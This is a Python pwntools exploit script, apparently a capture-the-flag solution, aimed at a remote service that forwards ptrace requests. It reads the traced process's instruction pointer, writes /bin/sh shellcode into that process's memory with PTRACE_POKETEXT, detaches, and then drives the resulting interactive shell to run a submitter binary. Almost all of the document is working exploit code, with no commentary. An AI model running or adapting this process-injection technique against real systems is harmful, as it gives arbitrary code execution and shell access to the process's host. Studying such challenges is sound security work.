from pwn import *
context.arch = 'amd64'
def u64v(b: bytes) -> int:
    return u64(b.ljust(8, b'\x00'))

gdbscript = '''
set follow-fork-mode parent
c
'''

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

def conn(debug=False):
    return remote(HOST, PORT)    

io = conn(False)

PTRACE_TRACEME =          0
PTRACE_EVENT_FORK =       1
PTRACE_O_TRACESYSGOOD =   0x00000001
PTRACE_PEEKTEXT =         1
PTRACE_EVENT_VFORK =      2
PTRACE_O_TRACEFORK =      0x00000002
PTRACE_PEEKDATA =         2
PTRACE_EVENT_CLONE =      3
PTRACE_PEEKUSER =         3
PTRACE_PEEKUSR =          3
PTRACE_EVENT_EXEC =       4
PTRACE_O_TRACEVFORK =     0x00000004
PTRACE_POKETEXT =         4
PTRACE_EVENT_VFORK_DONE = 5
PTRACE_POKEDATA =         5
PTRACE_EVENT_EXIT =       6
PTRACE_POKEUSER =         6
PTRACE_POKEUSR =          6
PTRACE_CONT =             7
PTRACE_KILL =             8
PTRACE_O_TRACECLONE =     0x00000008
PTRACE_SINGLESTEP =       9
PTRACE_GETREGS =          12
PTRACE_SETREGS =          13
PTRACE_GETFPREGS =        14
PTRACE_SETFPREGS =        15
PTRACE_ATTACH =           0x10
PTRACE_O_TRACEEXEC =      0x00000010
PTRACE_DETACH =           0x11
PTRACE_GETFPXREGS =       18
PTRACE_SETFPXREGS =       19
PTRACE_SETOPTIONS =       21
PTRACE_SYSCALL =          24
PTRACE_O_TRACEVFORKDONE = 0x00000020
PTRACE_O_TRACEEXIT =      0x00000040
PTRACE_O_MASK =           0x0000007f
PTRACE_GETEVENTMSG =      0x4201
PTRACE_GETSIGINFO =       0x4202
PTRACE_SETSIGINFO =       0x4203


def ptrace(request, addr, data, cont=True):
	io.sendlineafter(b"What ptrace request do you want to send?", hex(request).encode())
	io.sendlineafter(b"What address do you want?", hex(addr).encode())
	io.sendlineafter(b"What do you want copied into data?", hex(data).encode())
	io.recvuntil(b"ptrace returned 0x")
	out = int(io.recvline()[:-1], 16)
	io.sendlineafter(b"Do another (0/1)?", b"1" if cont else b"0")
	return out

RIP = 16
rip = ptrace(PTRACE_PEEKUSER, 8 * RIP, 0);


payload = asm(shellcraft.amd64.sh())

for i in range(0, len(payload), 4):
	data = u64v(payload[i:i+4])
	out = ptrace(PTRACE_POKETEXT, rip+i, data);
	print(hex(out))

ptrace(PTRACE_PEEKUSER, 8 * RIP, 0, False);

time.sleep(0.5)
io.sendline(b"./submitter")
io.interactive()

